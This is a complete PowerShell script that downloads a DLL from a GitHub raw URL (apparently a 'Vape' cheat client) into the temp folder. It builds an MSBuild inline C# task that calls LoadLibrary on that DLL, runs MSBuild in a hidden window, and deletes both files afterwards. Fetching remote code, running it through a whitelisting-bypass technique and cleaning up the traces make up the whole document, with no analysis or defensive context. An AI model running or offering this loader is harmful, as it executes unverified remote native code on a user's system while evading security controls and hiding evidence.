# Download DLL to temp location - USE RAW FILE LINK
$dllUrl = "https://raw.githubusercontent.com/Zaza-YT/VapeDll/main/vape4.17%202.dll"  # Must point to actual DLL file
$tempDll = "$env:TEMP\inject.dll"

try {
    # Add user-agent header to avoid GitHub blocking
    $client = New-Object System.Net.WebClient
    $client.Headers.Add("user-agent", "Mozilla/5.0")
    $client.DownloadFile($dllUrl, $tempDll)
    
    if (-not (Test-Path $tempDll)) {
        throw "Download failed - file not found"
    }

    # Define the XML payload
    $xmlPayload = @"
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="Injection">
    <ClassExample />
  </Target>
  <UsingTask TaskName="ClassExample" TaskFactory="CodeTaskFactory" AssemblyFile="$(Get-Item "C:\Windows\Microsoft.NET\Framework\v*\Microsoft.Build.Tasks.v*.dll" | Select-Object -First 1 -ExpandProperty FullName)">
    <Task>
      <Code Type="Class" Language="cs">
        <![CDATA[
          using System;
          using System.Runtime.InteropServices;
          public class ClassExample : Microsoft.Build.Utilities.Task {
            [DllImport("kernel32.dll")]
            public static extern IntPtr LoadLibrary(string dll);
            public override bool Execute() {
              LoadLibrary(@"$tempDll");
              return true;
            }
          }
        ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>
"@

    # Save and execute
    $xmlPath = "$env:TEMP\build.xml"
    $xmlPayload | Out-File $xmlPath -Force
    
    # Find MSBuild path dynamically
    $msbuild = (Get-Item "${env:ProgramFiles(x86)}\Microsoft Visual Studio\*\*\MSBuild\Current\Bin\MSBuild.exe" | 
               Select-Object -First 1 -ExpandProperty FullName)
    
    if (-not $msbuild) {
        $msbuild = "msbuild.exe"  # Fallback to PATH
    }

    if (Test-Path $xmlPath) {
        $proc = Start-Process $msbuild -ArgumentList """$xmlPath""" -WindowStyle Hidden -PassThru
        $proc.WaitForExit(5000)  # Wait max 5 seconds
        
        # Cleanup
        Remove-Item $tempDll -Force -ErrorAction SilentlyContinue
        Remove-Item $xmlPath -Force -ErrorAction SilentlyContinue
    }
}
catch {
    Write-Error "Failed: $_"
    exit 1
}
